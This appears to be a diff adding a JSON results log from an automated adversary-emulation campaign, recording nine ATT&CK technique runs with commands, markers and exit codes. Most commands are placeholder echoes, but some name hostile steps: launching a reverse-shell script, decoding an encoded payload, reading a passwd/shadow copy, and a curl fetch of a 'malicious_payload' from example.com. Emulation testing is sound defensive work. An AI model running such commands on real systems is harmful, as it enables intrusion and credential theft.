@@ -1,0 +1,168 @@
+{
+  "campaign_id": "C0045",
+  "host_id": "autosut-024b67e717",
+  "runs": [
+    {
+      "technique_id": "T1190",
+      "admitted": true,
+      "executed": true,
+      "effect_observed": true,
+      "command": "echo 'Exploit executed' > /tmp/exploit_public_facing_app.txt",
+      "effect_marker": "Exploit executed",
+      "exit_code": 0,
+      "abstained_reason": null,
+      "rehearsal": {
+        "consistent": true,
+        "missing_credential_users": [],
+        "missing_services": [],
+        "missing_artifact_paths": [],
+        "missing_commands": [],
+        "remote_requirement_unmet": []
+      }
+    },
+    {
+      "technique_id": "T1059.006",
+      "admitted": true,
+      "executed": true,
+      "effect_observed": false,
+      "command": "python3 /tmp/python_reverse_shell.py",
+      "effect_marker": "reverse_shell_executed",
+      "exit_code": 2,
+      "abstained_reason": null,
+      "rehearsal": {
+        "consistent": true,
+        "missing_credential_users": [],
+        "missing_services": [],
+        "missing_artifact_paths": [],
+        "missing_commands": [],
+        "remote_requirement_unmet": []
+      }
+    },
+    {
+      "technique_id": "T1546.004",
+      "admitted": true,
+      "executed": true,
+      "effect_observed": true,
+      "command": "echo 'ShadowRay executed' > /tmp/unix_shell_config.txt",
+      "effect_marker": "ShadowRay executed",
+      "exit_code": 0,
+      "abstained_reason": null,
+      "rehearsal": {
+        "consistent": true,
+        "missing_credential_users": [],
+        "missing_services": [],
+        "missing_artifact_paths": [],
+        "missing_commands": [],
+        "remote_requirement_unmet": []
+      }
+    },
+    {
+      "technique_id": "T1068",
+      "admitted": true,
+      "executed": true,
+      "effect_observed": true,
+      "command": "cp /tmp/privilege_escalation_payload.txt /tmp/privilege_escalation_payload_backup.txt && echo 'Privilege escalation payload copied' > /tmp/compute_hijacking.txt",
+      "effect_marker": "Privilege escalation payload copied",
+      "exit_code": 0,
+      "abstained_reason": null,
+      "rehearsal": {
+        "consistent": true,
+        "missing_credential_users": [],
+        "missing_services": [],
+        "missing_artifact_paths": [],
+        "missing_commands": [],
+        "remote_requirement_unmet": []
+      }
+    },
+    {
+      "technique_id": "T1027.013",
+      "admitted": true,
+      "executed": true,
+      "effect_observed": false,
+      "command": "cat /tmp/encrypted_encoded_file.txt | base64 --decode > /tmp/decoded_file.py && echo 'Executed T1027.013' > /tmp/compute_hijacking.txt",
+      "effect_marker": "Executed T1027.013",
+      "exit_code": 1,
+      "abstained_reason": null,
+      "rehearsal": {
+        "consistent": true,
+        "missing_credential_users": [],
+        "missing_services": [],
+        "missing_artifact_paths": [],
+        "missing_commands": [],
+        "remote_requirement_unmet": []
+      }
+    },
+    {
+      "technique_id": "T1003.008",
+      "admitted": true,
+      "executed": true,
+      "effect_observed": false,
+      "command": "cat /tmp/etc_passwd_shadow.txt > /tmp/compute_hijacking.txt && echo 'ShadowRay executed' >> /tmp/compute_hijacking.txt",
+      "effect_marker": "ShadowRay executed",
+      "exit_code": 0,
+      "abstained_reason": null,
+      "rehearsal": {
+        "consistent": true,
+        "missing_credential_users": [],
+        "missing_services": [],
+        "missing_artifact_paths": [],
+        "missing_commands": [],
+        "remote_requirement_unmet": []
+      }
+    },
+    {
+      "technique_id": "T1016",
+      "admitted": true,
+      "executed": true,
+      "effect_observed": true,
+      "command": "echo 'Network configuration discovery executed' > /tmp/network_configuration_discovery.txt",
+      "effect_marker": "Network configuration discovery executed",
+      "exit_code": 0,
+      "abstained_reason": null,
+      "rehearsal": {
+        "consistent": true,
+        "missing_credential_users": [],
+        "missing_services": [],
+        "missing_artifact_paths": [],
+        "missing_commands": [],
+        "remote_requirement_unmet": []
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "admitted": true,
+      "executed": true,
+      "effect_observed": false,
+      "command": "curl -o /tmp/compute_hijacking.txt http://example.com/malicious_payload",
+      "effect_marker": "IngressToolTransferExecuted",
+      "exit_code": 0,
+      "abstained_reason": null,
+      "rehearsal": {
+        "consistent": true,
+        "missing_credential_users": [],
+        "missing_services": [],
+        "missing_artifact_paths": [],
+        "missing_commands": [],
+        "remote_requirement_unmet": []
+      }
+    },
+    {
+      "technique_id": "T1496.001",
+      "admitted": true,
+      "executed": true,
+      "effect_observed": true,
+      "command": "echo 'Compute hijacking executed' > /tmp/compute_hijacking.txt",
+      "effect_marker": "Compute hijacking executed",
+      "exit_code": 0,
+      "abstained_reason": null,
+      "rehearsal": {
+        "consistent": true,
+        "missing_credential_users": [],
+        "missing_services": [],
+        "missing_artifact_paths": [],
+        "missing_commands": [],
+        "remote_requirement_unmet": []
+      }
+    }
+  ]
+}
